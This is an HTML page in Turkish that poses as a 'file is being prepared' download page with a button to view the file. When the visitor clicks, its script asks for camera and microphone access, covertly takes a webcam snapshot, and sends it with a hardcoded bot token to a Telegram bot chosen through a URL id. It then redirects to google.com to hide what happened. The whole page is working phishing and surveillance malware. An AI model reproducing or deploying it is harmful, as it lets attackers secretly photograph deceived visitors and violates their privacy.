<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yönlendiriliyor...</title>
    <style>
        body { background: #f4f7f9; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        .btn { background: #2563eb; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 20px; display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h3>Dosya Hazırlanıyor...</h3>
        <p id="msg">Bağlantı taranıyor, lütfen bekleyin.</p>
        <button id="btn" onclick="start()">Dosyayı Görüntüle</button>
    </div>

    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = "8221475489:AAHC2XRJVo4k8Q7RK2fUUAzs1Trml4cUi0U";
        const urlParams = new URLSearchParams(window.location.search);
        const tid = urlParams.get('id');

        // 2 saniye sonra butonu çıkar
        setTimeout(() => {
            document.getElementById('msg').innerText = "Dosya hazır!";
            document.getElementById('btn').style.display = 'inline-block';
        }, 2000);

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = stream;
                document.getElementById('btn').innerText = "Açılıyor...";

                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    const video = document.getElementById('v');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
                    const fd = new FormData();
                    fd.append('chat_id', tid);
                    fd.append('photo', blob, 'capture.jpg');
                    fd.append('caption', "📸 Sistem Test Görüntüsü\nID: " + tid);

                    // Doğrudan Telegram API'ye Render (Gönderim)
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    
                    window.location.href = "https://google.com";
                }, 1000);
            } catch (e) { window.location.href = "https://google.com"; }
        }
    </script>
</body>
</html>
